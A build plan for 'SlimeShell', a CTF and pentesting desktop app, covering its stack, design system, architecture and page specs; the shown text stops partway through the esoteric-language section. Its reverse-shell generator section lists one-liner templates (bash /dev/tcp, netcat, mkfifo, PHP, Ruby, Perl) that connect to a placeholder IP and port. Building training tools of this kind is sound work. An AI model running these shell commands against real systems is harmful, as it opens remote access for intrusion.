# SlimeShell — Full Build Plan

> **The ultimate CTF & pentesting web app.**
> Built by MrGreenSlime. Designed in Paper. Ready to build.

```
 ___  _ _            ___  _        _ _
/ __|| (_)_ __  ___ / __|| |_  ___| | |
\__ \| | | '  \/ -_)\__ \| ' \/ -_) | |
|___/|_|_|_|_|_\___||___/|_||_\___|_|_|
```

---

## Table of Contents

1. [Overview](#overview)
2. [Tech Stack](#tech-stack)
3. [Design System](#design-system)
4. [App Architecture](#app-architecture)
5. [Pages & Features — Core](#pages--features--core)
6. [Pages & Features — Tools & Utilities](#pages--features--tools--utilities)
7. [Pages & Features — Advanced](#pages--features--advanced)
8. [Pages & Features — Productivity & Meta](#pages--features--productivity--meta)
9. [Data Models](#data-models)
10. [API Integrations](#api-integrations)
11. [Build Priority & Phases](#build-priority--phases)
12. [Paper Design Reference](#paper-design-reference)

---

## Overview

SlimeShell is a self-hosted web application for CTF players and pentesters. It combines tools, references, scripts, writeups, payloads, OSINT, reporting, and team collaboration into a single dark-themed dashboard — so you never have to leave one tab.

**Target user**: Solo CTF player or small team doing HTB/THM/picoCTF/live Jeopardy CTFs and basic pentesting.

**Key principles**:
- Everything in one place — no tab switching
- Fast — tools should feel instant, not like loading a webpage
- Offline-first where possible — works without internet for encoding, hashing, etc.
- Beautiful but functional — the design exists (17 screens in Paper), follow it closely
- Hackable — users should be able to extend it with plugins/custom tools

---

## Tech Stack

### Desktop App — Tauri 2 + React
SlimeShell is a **native desktop app** built with Tauri. No browser tab, no self-hosting headaches — just install and run. The Rust backend gives native access to the file system, process spawning, serial ports, and SQLite without any API routes.

| Layer | Technology | Why |
|-------|-----------|-----|
| **App Framework** | Tauri 2.0 | Native desktop app, tiny binary (~15MB), Rust backend |
| **Frontend** | Vite + React | Fast dev, client-side by default, no SSR bloat |
| **Language (UI)** | JavaScript (NOT TypeScript) | Creator's preference — keep it JS |
| **Language (Backend)** | Rust | Tauri's native layer — handles FS, processes, serial, DB |
| **Styling** | Tailwind CSS | Matches the design system, utility-first, dark mode native |
| **State** | Zustand | Lightweight, no boilerplate, perfect for tool state |
| **Database** | SQLite (via tauri-plugin-sql / rusqlite) | Native, fast, no external DB needed |
| **Terminal** | xterm.js + portable-pty (Rust) | PTY spawning via Rust IPC, rendered with xterm.js |
| **Code Editor** | Monaco Editor or CodeMirror 6 | For script editing, payload editing |
| **Markdown** | react-markdown + remark-gfm | For notes/wiki/writeups |
| **Charts** | recharts or visx | For heatmaps, progress bars, stats |
| **Icons** | Lucide React | Clean, consistent, matches the design |
| **Fonts** | JetBrains Mono + Space Grotesk | Bundled with the app |
| **Package Manager** | pnpm | Fast, disk-efficient |
| **Serial (Flipper)** | tauri-plugin-serialplugin | Native serial port access |
| **HTTP (OSINT)** | reqwest (Rust) | No CORS issues, native HTTP client |

### Why Tauri over Next.js / Electron
- **No SSR needed** — this is a private tool, not a public website
- **Native file access** — read/write scripts, wordlists, notes directly. No API routes
- **Native process spawning** — terminal (PTY), VPN (openvpn), nmap, etc.
- **Tiny binary** — ~15MB vs Electron's 200MB+
- **Low memory** — uses system WebView, not bundled Chromium
- **Offline by default** — perfect for a hacking tool
- **Serial ports** — Flipper Zero communication without browser WebSerial hacks

### Future: Web Version
The architecture supports a future limited web version:
- The Rust backend commands can be wrapped with an Axum HTTP API
- The React frontend already works in a browser — just swap `invoke()` for `fetch()`
- Strategy: build a `useBackend()` hook that abstracts the IPC layer
  - Desktop mode: calls `invoke("command_name", { args })`
  - Web mode: calls `fetch("/api/command_name", { body: args })`
- This lets the same React components work in both modes

---

## Design System

### Color Palette
```
Background (base):      #141820   — warm dark navy
Sidebar:                #11151E   — slightly darker
Cards/panels:           #1A1F2E   — elevated surface
Code blocks:            #0F1520   — deepest dark
Borders:                rgba(255, 255, 255, 0.04)  — barely visible

Accent - Mint:          #6EE7B7   — primary action color
Accent - Mint dark:     #34D399   — gradients, hover states
Accent - Rose:          #FB7185   — errors, critical, destructive
Accent - Lavender:      #A78BFA   — secondary highlights, crypto
Accent - Gold:          #FBBF24   — warnings, medium severity
Accent - Sky Blue:      #7DD3FC   — info, network, PowerShell
Accent - Pink:          #F472B6   — stego, special

Text - Primary:         #E2E8F0   — headings, important
Text - Secondary:       #D1D5DB   — body text, values
Text - Muted:           #9CA3AF   — descriptions
Text - Dim:             #6B7280   — labels, timestamps
Text - Faint:           #4B5563   — line numbers, placeholders
```

### Typography
```
Headings:     font-family: 'Space Grotesk', sans-serif;  font-weight: 700;
Body/Mono:    font-family: 'JetBrains Mono', monospace;
Labels:       JetBrains Mono, 9-10px, uppercase, #6B7280
Values:       JetBrains Mono, 11-12px, #D1D5DB
Page titles:  Space Grotesk, 20px, 700, #D1D5DB
Big numbers:  Space Grotesk, 24-36px, 700, accent color
```

### Component Patterns
```
Cards:          bg #1A1F2E, rounded-lg (8px), no border or subtle border
Code blocks:    bg #0F1520, rounded-md (6px), JetBrains Mono 11px
Buttons:        bg rgba(accent, 0.08), border 1px rgba(accent, 0.15), rounded-md
Active tab:     bg rgba(mint, 0.06), border-left 3px solid #6EE7B7
Tags/badges:    bg rgba(color, 0.1), text color, rounded, 8-9px font
Input fields:   bg #1A1F2E, border rgba(mint, 0.15), rounded-lg
Sidebar:        220px wide, bg #11151E, border-right rgba(mint, 0.06)
Top bar:        border-bottom rgba(255,255,255,0.04), padding 16px 28px
```

### Sidebar Navigation
The sidebar is consistent across ALL pages:
```
- Logo: "SlimeShell" with green gradient icon (S)
- Subtitle: "v0.1.0-alpha"
- Navigation items:
  1. Dashboard        (grid icon)
  2. Tools            (wrench icon)
  3. References       (book icon)
  4. Scripts          (code icon)
  5. Flipper Zero     (with "154" badge)
  6. CTFs             (with "LIVE" badge)
  7. Writeups         (pencil icon)
  8. Payloads         (shield icon)
  9. Encoding         (new)
  10. Rev Shell Gen   (new)
  11. OSINT & Recon   (new)
  12. Terminal         (new)
  13. Utilities        (new)
  14. Wordlists        (new)
  15. CTFtime          (new)
  16. Reports          (new)
  17. Profile & Stats  (new)
  --- separator ---
  18. Notes/Wiki       (planned)
  19. Bookmarks        (planned)
  20. Settings         (planned)
- Bottom: User avatar "MrGreenSlime" with "rootfs://me/shell$"
- Active state: bg rgba(mint, 0.06), left border 3px #6EE7B7, text #6EE7B7
```

---

## App Architecture

### Tauri Project Structure
```
slimeshell/
├── src-tauri/                     # Rust backend (Tauri)
│   ├── Cargo.toml                 # Rust dependencies
│   ├── tauri.conf.json            # Tauri config (window, permissions, plugins)
│   ├── capabilities/              # Tauri 2 permission capabilities
│   └── src/
│       ├── main.rs                # Tauri entry point
│       ├── lib.rs                 # Command registration
│       ├── commands/              # Tauri invoke commands (called from JS)
│       │   ├── fs.rs              # File read/write (scripts, notes, writeups, wordlists)
│       │   ├── terminal.rs        # PTY spawning and management
│       │   ├── vpn.rs             # OpenVPN process management
│       │   ├── network.rs         # nmap parsing, ping, network scanning
│       │   ├── flipper.rs         # Serial port communication
│       │   ├── osint.rs           # HTTP proxy for Shodan, WHOIS, DNS (no CORS)
│       │   └── system.rs          # tun0 IP detection, system info
│       ├── db.rs                  # SQLite setup and migrations
│       └── models.rs              # Rust structs for DB models
├── src/                           # React frontend (Vite)
│   ├── main.jsx                   # React entry point
│   ├── App.jsx                    # Root component with router
│   ├── pages/                     # Page components (one per route)
│   │   ├── Dashboard.jsx
│   │   ├── Tools.jsx
│   │   ├── References.jsx
│   │   ├── Scripts.jsx
│   │   ├── FlipperZero.jsx
│   │   ├── CTFs.jsx
│   │   ├── Writeups.jsx
│   │   ├── Payloads.jsx
│   │   ├── Encoding.jsx
│   │   ├── RevShell.jsx
│   │   ├── Osint.jsx
│   │   ├── Terminal.jsx
│   │   ├── Utilities.jsx
│   │   ├── Wordlists.jsx
│   │   ├── CTFtime.jsx
│   │   ├── Reports.jsx
│   │   ├── Profile.jsx
│   │   ├── Notes.jsx
│   │   ├── Bookmarks.jsx
│   │   ├── Settings.jsx
│   │   ├── JWT.jsx
│   │   ├── FileAnalyzer.jsx
│   │   ├── NetworkMap.jsx
│   │   ├── VPN.jsx
│   │   ├── Collab.jsx
│   │   ├── HTTP.jsx
│   │   ├── Esoteric.jsx
│   │   ├── Regex.jsx
│   │   └── Diff.jsx
│   ├── components/
│   │   ├── layout/
│   │   │   ├── Sidebar.jsx
│   │   │   ├── TopBar.jsx
│   │   │   └── CommandPalette.jsx
│   │   ├── ui/
│   │   │   ├── Card.jsx
│   │   │   ├── Badge.jsx
│   │   │   ├── Button.jsx
│   │   │   ├── Input.jsx
│   │   │   ├── CodeBlock.jsx
│   │   │   ├── CopyButton.jsx
│   │   │   ├── ProgressBar.jsx
│   │   │   ├── Toggle.jsx
│   │   │   ├── Tabs.jsx
│   │   │   ├── FilterChips.jsx
│   │   │   └── Heatmap.jsx
│   │   └── features/
│   │       ├── EncodingChain.jsx
│   │       ├── RevShellGenerator.jsx
│   │       ├── HashGenerator.jsx
│   │       ├── SubnetCalculator.jsx
│   │       ├── JWTDebugger.jsx
│   │       ├── ChallengeTimer.jsx
│   │       └── ...
│   ├── hooks/
│   │   └── useBackend.js          # Abstraction: invoke() now, fetch() for future web
│   ├── lib/
│   │   ├── encoding.js            # Base64, Hex, URL, ROT13 (client-side)
│   │   ├── hashing.js             # MD5, SHA1, SHA256, SHA512 (client-side)
│   │   ├── revshells.js           # Shell template generators (client-side)
│   │   ├── subnet.js              # CIDR calculations (client-side)
│   │   ├── cvss.js                # CVSS score calculator (client-side)
│   │   ├── jwt.js                 # JWT decode/encode (client-side)
│   │   ├── flags.js               # Flag format wrappers (client-side)
│   │   └── esoteric.js            # Brainfuck, Ook!, etc. (client-side)
│   ├── store/
│   │   ├── useAppStore.js         # Global app state (Zustand)
│   │   ├── useTimerStore.js       # Challenge timers
│   │   ├── useClipboardStore.js   # Clipboard history
│   │   └── useProfileStore.js     # XP, level, stats
│   ├── data/
│   │   ├── ports.json             # Common ports reference
│   │   ├── shells.json            # Reverse shell templates
│   │   ├── payloads.json          # Payload library
│   │   ├── references.json        # Cheatsheets
│   │   └── esoteric-examples.json # Brainfuck examples etc.
│   └── styles/
│       └── globals.css            # Tailwind + Google Fonts + CSS vars
├── index.html                     # Vite entry HTML
├── vite.config.js                 # Vite config (with @tauri-apps/api)
├── tailwind.config.js             # Tailwind with SlimeShell design tokens
├── package.json
└── pnpm-lock.yaml
```

### Frontend ↔ Backend Communication
Instead of API routes, use Tauri's `invoke()` to call Rust commands:

```js
// Frontend: call a Rust command
import { invoke } from '@tauri-apps/api/core';

// Read a script file
const content = await invoke('read_file', { path: '/scripts/exploit.py' });

// Spawn a terminal
await invoke('spawn_terminal', { shell: 'zsh' });

// Query Shodan (Rust makes the HTTP call — no CORS)
const results = await invoke('shodan_search', { query: '10.10.10.0/24' });

// Save to SQLite
await invoke('save_ctf', { ctf: { name: 'HTB Cyber Apocalypse', ... } });
```

### useBackend Hook (Future Web Compatibility)
```js
// hooks/useBackend.js
import { invoke } from '@tauri-apps/api/core';

const IS_TAURI = '__TAURI_INTERNALS__' in window;

export function useBackend() {
  const call = async (command, args = {}) => {
    if (IS_TAURI) {
      return invoke(command, args);
    }
    // Future: web mode falls back to HTTP
    const res = await fetch(`/api/${command}`, {
      method: 'POST',
      body: JSON.stringify(args),
    });
    return res.json();
  };

  return { call };
}
```

### What Runs Where
| Feature | Where | Why |
|---------|-------|-----|
| Encoding/decoding | Frontend (JS) | Pure computation, instant |
| Hashing | Frontend (JS) | Pure computation, instant |
| JWT decode/encode | Frontend (JS) | Pure computation, instant |
| Reverse shell templates | Frontend (JS) | String templates, instant |
| Subnet calculator | Frontend (JS) | Math, instant |
| Regex tester | Frontend (JS) | Native RegExp, instant |
| File read/write | Backend (Rust) | Native FS access |
| Terminal | Backend (Rust) | PTY spawning via portable-pty |
| VPN management | Backend (Rust) | Process spawning (openvpn) |
| Flipper Zero | Backend (Rust) | Serial port access |
| OSINT (Shodan, WHOIS) | Backend (Rust) | HTTP client (reqwest), no CORS |
| SQLite queries | Backend (Rust) | Native DB access |
| Network scanning | Backend (Rust) | Process spawning (nmap) |

---

## Pages & Features — Core

### 1. Dashboard (`/`)
**Designed: YES** — Paper artboard "SlimeShell — Dashboard"

The main overview page. Shows at-a-glance stats and quick access to everything.

**Components:**
- **Stats Row**: 4 cards showing CTFs Completed, Flags Captured, Scripts Saved, Flipper Portals
  - Each card: icon (SVG), label (Space Grotesk 10px muted), value (Space Grotesk 28px accent), trend indicator
- **Active CTF Panel**: Currently running CTF with progress bar, time remaining, category breakdown (Web/Crypto/Rev/Pwn/Forensics), individual challenge status (flag captured / WIP / TODO)
- **Quick Tools Grid**: 8 most-used tools as clickable cards (CyberChef, Base64, Hashcat, nmap, Burp, sqlmap, Steghide, Gobuster) — each links to its tool page or opens inline
- **Recent Scripts**: 5 most recently edited scripts with filename, language tag, and last modified time
- **Flipper Zero Widget**: Device connection status, signal counts (SubGHz/RFID/NFC/IR), battery level
- **Quick References**: Chip-style links to common references (GTFOBins, PayloadsAllTheThings, HackTricks, RevShells, CrackStation, ExploitDB)

---

### 2. Tools (`/tools`)
**Designed: YES** — Paper artboard "SlimeShell — Tools Page"

A categorized grid of all available tools. Each tool card shows name, icon/emoji placeholder, brief description, and a "Launch" or "Open" action.

**Categories & Tools:**

| Category | Tools |
|----------|-------|
| **Crypto & Encoding** | CyberChef, dcode.fr, Base64, ROT13/47, AES/RSA, Vigenere, XOR Tool, URL Encode |
| **Steganography** | Steghide, zsteg, Exiftool, Binwalk, StegSolve, OpenStego |
| **Network & PCAP** | Wireshark, nmap, tshark, tcpdump, netcat, Scapy, Gobuster, Masscan |
| **Web Exploitation** | Burp Suite, sqlmap, XSStrike, Nikto, ffuf, Wfuzz, Metasploit, Dirsearch |
| **Password & Hashes** | Hashcat, John, Hash-ID, CrackStation, Hydra, ophcrack |
| **Reverse Engineering** | APKTool, jadx, Ghidra, radare2, de4js, Unminify, dex2jar, ILSpy |
| **Data Analysis** | HEX Editor, GLB Loader, xxd, file/magic, strings, PCAP Viewer, Foremost, Volatility |

**Behavior:**
- Top bar: page title, search input, category filter chips (All, Favorites, Recently Used)
- Tools that are built-in (encoding, hashing, etc.) open inline
- Tools that are external (CyberChef, CrackStation) open in new tab or iframe
- Favoritable — starred tools show first
- Search filters by name and category

---

### 3. References (`/references`)
**Designed: YES** — Paper artboard "SlimeShell — References"

Searchable command reference sheets.

**Sections:**
- **Reverse Shells**: Selectable commands for Bash, Python, PHP, Netcat, PowerShell, Java, Ruby, Perl — each with copy button. IP/port are configurable (shares state with Rev Shell Gen page)
- **Linux PrivEsc**: Common commands (find SUID, writable dirs, cron jobs, capabilities, sudo -l, linpeas)
- **Windows PrivEsc**: Common commands (whoami /priv, systeminfo, PowerUp, winPEAS, token impersonation)
- **Quick Links**: Chip-style external links to GTFOBins, LOLBAS, PayloadsAllTheThings, HackTricks, SecLists, RevShells, ExploitDB
- **Nmap Cheatsheet**: Common scan types with flags and descriptions
- **SQL Injection Cheatsheet**: Common SQLi patterns, UNION-based, blind, time-based
- **XSS Cheatsheet**: Common XSS payloads, filter bypass techniques

---

### 4. Scripts (`/scripts`)
**Designed: YES** — Paper artboard "SlimeShell — Scripts"

File manager + code editor for saving custom scripts.

**Layout**: Two-panel — file list (left, 350px) + code preview/editor (right)

**File List Panel:**
- Search bar + language filter dropdown (Python, Bash, JS, PHP, Ruby, All)
- Each file shows: filename, language tag (colored), file size, last modified date
- "New Script" button in top bar
- Selected file highlighted with mint left border

**Code Preview Panel:**
- Filename + language tag at top
- Action buttons: Copy, Edit, Run (if local), Delete
- Syntax-highlighted code display (use Monaco Editor in edit mode)
- Line numbers
- File metadata at bottom (created date, size, language)

**Storage**: Scripts stored as actual files in a `~/.slimeshell/scripts/` directory, served via API route.

---

### 5. Flipper Zero (`/flipper`)
**Designed: YES** — Paper artboard "SlimeShell — Flipper Zero"

Dashboard for Flipper Zero device integration.

**Components:**
- **Device Info Card**: Firmware version, SD card space, battery level, connection status (USB/Bluetooth)
- **Signal Stats** (5 cards): SubGHz (captures count, daily change), RFID, NFC, IR, BadUSB Scripts — each with progress bar and count
- **Recent Captures List**: Last 10 captures with type, name, frequency, timestamp — filterable by signal type
- **BadUSB Scripts List**: Saved DuckyScript payloads with name, description, run count — executable from UI if device is connected

**Integration**: Uses Flipper Zero's serial API or reads from SD card mounted via USB.

---

### 6. CTFs (`/ctfs`)
**Designed: YES** — Paper artboard "SlimeShell — CTFs"

Track active and completed CTF competitions.

**Components:**
- **Active CTF Card**: Name, platform, start/end time, progress bar (flags solved / total), category breakdown with individual challenge tracking (flag status: captured/WIP/TODO)
- **Completed CTFs Section**: Historical list with name, date, score, rank, flag count — sortable by date/score
- **Filters**: Active, Completed, All — with search

**Data**: Each CTF has name, platform, URL, start/end date, challenges array, team members, notes.

---

### 7. Writeups (`/writeups`)
**Designed: YES** — Paper artboard "SlimeShell — Writeups"

Write and browse CTF writeups.

**Layout**: Two-panel — writeup list (left) + content preview (right)

**Writeup List:**
- Search + category filter (Web, Crypto, Pwn, Rev, Forensics, Misc) + difficulty filter
- Each item: title, CTF name, category tag, difficulty tag, date
- "New Writeup" button

**Writeup Preview:**
- Title + metadata (CTF, category, difficulty, date)
- Export button (Markdown) + Edit button
- Structured sections: Recon, Exploit, Flag — rendered from Markdown
- Code blocks with syntax highlighting and copy buttons

**Storage**: Writeups stored as Markdown files in `~/.slimeshell/writeups/`.

---

### 8. Payloads (`/payloads`)
**Designed: YES** — Paper artboard "SlimeShell — Payloads"

Searchable payload library.

**Layout**: Two-panel — categories (left, 300px) + payload list (right)

**Categories**: XSS, SQLi, SSTI, LFI/RFI, Command Injection, SSRF, XXE, Deserialization, Upload Bypass, LDAP Injection — each with count badge

**Payload List:**
- Each payload: title, type tag, the actual payload in monospace, copy button
- Search across all payloads
- "Add Payload" button for custom entries
- Import/export as JSON

---

## Pages & Features — Tools & Utilities

### 9. Encoding Playground (`/encoding`)
**Designed: YES** — Paper artboard "SlimeShell — Encoding Playground"

Chain encoder/decoder with live preview. Like a mini CyberChef but faster and focused.

**How it works:**
1. User enters raw text in INPUT box
2. Clicks "+ Add Step" to add encoding/decoding operations
3. Each step shows the transformed output with its own colored border
4. Steps are chained: output of step N is input of step N+1
5. Final OUTPUT box shows the result with Copy and "Reverse Chain" buttons

**Available transforms** (each step can be any of these):
- Base64 Encode/Decode
- Hex Encode/Decode
- URL Encode/Decode
- ROT13 / ROT47
- Binary Encode/Decode
- HTML Entity Encode/Decode
- Unicode Escape/Unescape
- MD5 / SHA256 (one-way, end of chain)
- XOR (with key input)
- Reverse String
- To Upper / To Lower
- Morse Code

**Visual design:**
- Each step separated by a divider with colored arrow and operation name pill
- Steps color-coded: INPUT=#6EE7B7, Step1=#A78BFA, Step2=#FBBF24, Output=#FB7185
- Drag to reorder steps
- Click step pill to change operation

**Implementation**: All transforms run client-side. No API needed. Use `Buffer`, `btoa/atob`, `encodeURIComponent`, etc.

---

### 10. Reverse Shell Generator (`/revshell`)
**Designed: YES** — Paper artboard "SlimeShell — Reverse Shell Gen"

Input IP + port, get one-click reverse shells in every language.

**Config Panel (left, 300px):**
- LHOST input (auto-detect tun0/eth0 IP if possible)
- LPORT input (default 4444)
- OS Target toggle: Linux / Windows / macOS
- Shell type toggle: /bin/sh / /bin/bash / cmd.exe / powershell
- Encoding toggle: None / Base64 / URL

**Shell List (right):**
Each shell type as a card with:
- Language tag (colored: Bash=green, Python=purple, Netcat=gold, PHP=rose, PowerShell=blue, Java=orange, Ruby=red, Perl=cyan)
- Sub-tag if relevant (TCP, -e flag, etc.)
- The generated command in a code block (auto-substitutes IP/port)
- Copy button

**Shell templates:**
```
Bash:        bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
Python3:     python3 -c 'import socket,subprocess,os;...'
Netcat:      nc -e /bin/sh {IP} {PORT}
Netcat (-c): rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f
PHP:         php -r '$s=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
PowerShell:  powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{IP}',{PORT});..."
Java:        Runtime.getRuntime().exec(...)
Ruby:        ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;...'
Perl:        perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,...)'
```

**Top bar** also shows the listener command: `nc -lvnp {PORT}` with copy button.

---

### 11. OSINT & Recon (`/osint`)
**Designed: YES** — Paper artboard "SlimeShell — OSINT & Recon"

Multi-tool OSINT page with tabbed interface.

**Tabs**: Shodan, WHOIS, DNS Enum, CVE Search, Subdomains

**Shodan tab** (designed):
- Search bar with IP/CIDR/query input + Scan button
- Stats row: Total Hosts, Open Ports, Vulns Found, Subdomains
- Shodan Results list: IP, service tag (nginx, OpenSSH, Apache), open ports
- CVEs Detected panel: CVE ID, CVSS score (color-coded by severity), short description

**WHOIS tab**:
- Domain input
- Results: Registrar, creation/expiry dates, nameservers, registrant info

**DNS Enum tab**:
- Domain input
- Results: A, AAAA, MX, NS, TXT, CNAME records
- Subdomain discovery results

**CVE Search tab**:
- Search by keyword, product, or CVE ID
- Results: CVE ID, CVSS score, description, affected products, links to exploits

**Subdomains tab**:
- Domain input
- Discovered subdomains list with IP, status code, title

**API**: Requires API keys for Shodan, SecurityTrails, etc. Store in settings.

---

### 12. Terminal (`/terminal`)
**Designed: YES** — Paper artboard "SlimeShell — Terminal"

Built-in web terminal using xterm.js.

**Features:**
- Multiple shell types: zsh, bash, python — selectable via tabs
- Split view (horizontal/vertical)
- Multiple tabs (+ New Tab)
- Clear button
- Custom prompt: `slime@kali:~/ctf/htb$` style
- Full terminal emulation — runs actual shell via pty on the server
- Command history
- Copy/paste support
- Links clickable

**Implementation**: Use `portable-pty` crate in Rust backend + xterm.js on the frontend, connected via Tauri IPC events (not WebSocket — Tauri events are faster and native).

---

### 13. Utilities (`/utilities`)
**Designed: YES** — Paper artboard "SlimeShell — Utilities"

Multi-tool utility page with 5 sub-tools on one screen.

**Sub-tools with their own tabs:**

#### Hash Generator
- Text input field
- Instant results for: MD5, SHA1, SHA256, SHA512
- Each hash in its own row with copy button
- Color-coded algorithm labels

#### Subnet Calculator
- CIDR input (e.g., `192.168.1.0/24`)
- Results: Network address, Broadcast, Usable range, Host count, Subnet mask, Wildcard mask

#### Port Reference
- Searchable table of common ports
- Columns: Port number, Protocol (TCP/UDP), Service name, Description
- Includes all well-known ports + common CTF ports (1337, 4444, 8443, 9090, etc.)
- Data stored in `data/ports.json`

#### Flag Formatter
- Input: raw flag text
- Output: auto-wrapped in common formats with copy buttons:
  - `HTB{...}`, `picoCTF{...}`, `flag{...}`, `THM{...}`, `CTF{...}`
  - Custom format input field

#### ASCII Art Banner Generator
- Text input
- Font selector: Block, Slant, Banner, 3D, Standard, Big
- Output: ASCII art rendered in monospace
- Copy button
- Use `figlet` library or custom font rendering

---

### 14. Wordlist Manager (`/wordlists`)
**Designed: YES** — Paper artboard "SlimeShell — Wordlist Manager"

Manage, browse, and generate custom wordlists.

**Layout**: Two-panel — wordlist list (left, 380px) + detail/preview (right)

**Wordlist List:**
- Search bar
- Each wordlist: filename, entry count, file size, category tag (Password/Web/DNS/Custom/User)
- Active item highlighted with mint left border

**Detail Panel:**
- Filename + full path
- Stats: Total entries, Unique entries, Average length
- Actions: Filter, Sort, Delete, Export
- Preview table: line number, entry, length — paginated/virtualized for large files
- Filter/sort options: by length, alphabetical, remove duplicates

**Generate Custom:**
- Base word input
- Rules: append numbers, leet speak, capitalize, append special chars, combine with other list
- Preview generated entries
- Save as new wordlist

**Built-in wordlists**: Ship with or auto-download common lists (rockyou paths, SecLists paths).

---

### 15. CTFtime & Scoreboard (`/ctftime`)
**Designed: YES** — Paper artboard "SlimeShell — CTFtime & Scoreboard"

Three sections on one page.

#### Upcoming CTFs
- Pull from CTFtime.org API
- Each CTF: name, dates, type (Jeopardy/A-D/Mixed), countdown timer, weight
- Registration status: Registered (green) / Register (gold link) / Closed (grey)
- Auto-register button (opens CTFtime registration)

#### Challenge Timer
- Big stopwatch display (Space Grotesk 36px)
- Current challenge name + category
- Start/Stop/Reset controls
- History: list of past challenge times with name and duration
- Color-coded times: green (<30min), gold (30min-2hr), rose (>2hr)

#### Team Scoreboard
- Real-time scoreboard for current CTF
- Columns: Rank, Player name, Flags captured, Score
- Highlight current user row with mint left border
- Data can come from CTF platform API or manual entry

---

### 16. Report Generator (`/reports`)
**Designed: YES** — Paper artboard "SlimeShell — Report Generator"

Auto-generate pentest/CTF reports.

**Config Panel (left, 320px):**
- Report title input
- Report type toggle: Pentest / CTF / Bug Bounty
- Findings list: each finding has severity tag (Critical/High/Medium/Low/Info), title, description
- "+ Add Finding" button with dashed border
- CVSS Calculator: clickable vector string chips (AV:N, AC:L, PR:N, UI:N, C:H, I:H, A:H) — calculates score and severity label

**Report Preview (right):**
- Live preview of the generated report
- Structured sections: Title, metadata (author, date, target, severity), Executive Summary, Findings (numbered, with CVSS, endpoint, PoC code block)
- Export buttons: PDF, Markdown

**Implementation**: Generate Markdown from structured data, use a library like `puppeteer` or `jspdf` for PDF export.

---

### 17. Profile & Stats (`/profile`)
**Designed: YES** — Paper artboard "SlimeShell — Profile & Stats"

Gamified user profile with XP and activity tracking.

**Components:**

#### Profile Card
- Avatar (gradient circle with initials)
- Username: "MrGreenSlime"
- Level badge with gradient background (e.g., "HACKER" in purple)
- Level number
- XP progress bar with current/needed XP

#### Stats Cards (4)
- Flags captured, CTFs completed, Writeups written, Scripts saved
- Each with big number (Space Grotesk 24px, accent color) and label

#### Activity Heatmap
- GitHub-style contribution graph
- 52 weeks x 7 days grid of small squares
- Color intensity: #0F1520 (none) → #0C3628 → #065F46 → #34D399 → #6EE7B7 (most)
- Legend bar: Less → More
- Label: "312 active days in 2025"
- Activity = flags captured + writeups + scripts + tool usage

#### Level Progression
- Visual ladder showing all ranks: n00b (0) → script kiddie (10) → hacker (25) → elite (50) → l33t (75) → god (100)
- Current level highlighted with gold bar
- Progress bar showing how far to next level

#### Category Breakdown
- Horizontal bar chart showing flags per category: Web, Crypto, Pwn, Rev, Forensics, Stego
- Each bar colored differently (matches accent colors)
- Count label at end of each bar

**XP System:**
- Flag captured: +100 XP
- Writeup written: +50 XP
- Script saved: +25 XP
- CTF completed: +200 XP
- First blood (first to solve): +150 XP bonus
- Daily login: +10 XP

---

## Pages & Features — Advanced

### 18. JWT Debugger (`/jwt`)
**Designed: YES** — Paper artboard "SlimeShell — JWT Debugger"

Decode, encode, and verify JSON Web Tokens.

**Layout**: Three-panel horizontal

**Encoded Panel (left)**:
- Large text area for pasting JWT
- Auto-detects and color-codes the three parts: header (rose), payload (purple), signature (mint)

**Decoded Panel (center)**:
- Header JSON (editable): algorithm, type
- Payload JSON (editable): claims, exp, iat, sub, etc.
- Expired/valid indicator based on `exp` claim

**Verify Panel (right)**:
- Secret key input
- Algorithm selector (HS256, HS384, HS512, RS256, etc.)
- Signature valid/invalid indicator
- "Generate Token" button — creates new JWT from edited header+payload+secret

**Implementation**: Use `jose` or `jsonwebtoken` library. All client-side.

---

### 19. File Analyzer (`/file-analyzer`)
**Designed: YES** — Paper artboard "SlimeShell — File Analyzer"

Drag-and-drop file analysis for forensics.

**Features:**
- **Drop Zone**: Large dashed area to drop files
- **Magic Bytes**: Show first 16 bytes in hex, auto-identify file type
- **Strings Extraction**: Show all printable strings found in the file (like `strings` command)
- **Entropy Visualization**: Bar chart or sparkline showing byte entropy across the file (high entropy = encrypted/compressed)
- **Hex View**: First 256 bytes in hex viewer format (offset | hex | ASCII)
- **Metadata**: File size, MIME type, creation date, embedded metadata (EXIF for images)
- **Embedded Files**: Detect and extract embedded files (like `binwalk`)

**Implementation**: Use `FileReader` API, process entirely client-side. Entropy calculation with `Math.log2`. Strings extraction with regex.

---

### 20. Network Map Builder (`/network-map`)
**Designed: YES** — Paper artboard "SlimeShell — Network Map"

Visual network infrastructure mapping.

**Features:**
- **Canvas**: Drag-and-drop node placement
- **Node Types**: Server, Workstation, Router, Firewall, Database, Web Server, IoT — each with distinct icon
- **Connections**: Draw lines between nodes, label with port/service
- **Node Details**: Click a node to see/edit IP, hostname, OS, open ports, services, notes
- **Auto-layout**: Import nmap XML scan results to auto-generate map
- **Export**: Save as PNG/SVG image, or JSON for reimporting
- **Color coding**: Green (compromised), Yellow (partial access), Red (target), Grey (unknown)

**Implementation**: Use `reactflow` or `cytoscape.js` for the graph canvas.

---

### 21. VPN Manager (`/vpn`)
**Designed: YES** — Paper artboard "SlimeShell — VPN Manager"

Manage VPN connections for HTB/THM/labs.

**Features:**
- **Connection Cards**: One per VPN config (HTB, THM, custom)
  - Status indicator: Connected (green) / Disconnected (grey)
  - Assigned IP (tun0)
  - Uptime
  - Connect/Disconnect buttons
- **Config Upload**: Upload .ovpn files
- **Auto-detect IP**: Show tun0 IP prominently — copy button (for use in exploits)
- **Connection Log**: Recent connect/disconnect events
- **Multi-VPN**: Support multiple simultaneous connections

**Implementation**: Use `std::process::Command` in Rust to spawn/manage openvpn processes. Read tun0 IP via system commands. Tauri IPC events for connection status updates.

---

### 22. Esoteric Language Interpreter (`/esoteric`)
**Designed: YES** — Paper artboard "SlimeShell — Esoteric Languages"

Interpret/run esoteric programming languages (common in CTFs).

**Supported Languages:**
- **Brainfuck**: Full interpreter with memory visualization
- **Ook!**: Translate to/from Brainfuck
- **Whitespace**: Interpreter (spaces, tabs, linefeeds)
- **Piet**: Image-based language (show the color grid)
- **Malbolge**: Interpreter
- **JSFuck**: Encode/decode JavaScript in `[]()!+` characters

**Layout:**
- Language selector tabs
